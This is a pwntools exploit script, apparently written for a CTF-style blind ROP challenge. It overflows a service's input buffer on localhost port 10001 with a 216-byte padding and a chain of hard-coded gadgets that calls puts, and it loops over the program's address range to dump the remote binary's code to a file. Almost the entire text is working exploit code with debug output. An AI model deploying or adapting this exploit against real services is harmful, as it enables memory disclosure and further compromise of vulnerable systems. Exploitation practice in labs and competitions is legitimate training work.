#-*- coding:utf-8 –*-
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')
#log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
def leakfunction(length, rdi_ret, puts_plt, stop_gadget):
	addr = 0x4005fd#0x400000
	result = ""
	offset = 0
	while addr < 0x401000:
		#print hex(addr)
		data = leak(length, rdi_ret, puts_plt, addr+offset, stop_gadget)
		print "data is " + data
		if data is None:
			continue
		else:
			result = data
			offset += len(data)
			print "[*] offset is "+ hex(offset)
			print "[*] addr is "+ hex(addr)
		with open('code', 'ab') as f:
			f.write(result)
	

def leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):
    sh = remote('127.0.0.1', 10001)
    payload = 'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(
        puts_plt) + p64(stop_gadget)
    sh.recvuntil('Please tell me:')
    sh.sendline(payload)
    try:
    	#sh.recvuntil(rdi_ret)
    	#hello = 'a' * length + p8((rdi_ret>>1)&0xff) + p8((rdi_ret>>2)&0xff) + p8(rdi_ret & 0xff)
    	hello = 'a' * length + '\x63\x09\x40'
    	print "[*] hello is " + hello
    	sh.recvuntil(hello)
    	#sh.recv()
        data = sh.recv()
        sh.close()
        
        try:
        	#print hex(rdi_ret)
            data = data[:data.index("\nHello")]
            #print data
        except Exception:
            data = data
        if data == "":
            data = '\x00'
        return data
    except Exception:
        sh.close()
        return None


length = 216
stop_gadget = 0x4007d6
brop_gadget = 0x40095a
rdi_ret = brop_gadget + 9
puts_plt = 0x400635

print "this is " + hex(rdi_ret)
leakfunction(length, rdi_ret, puts_plt, stop_gadget)

#io.interactive()
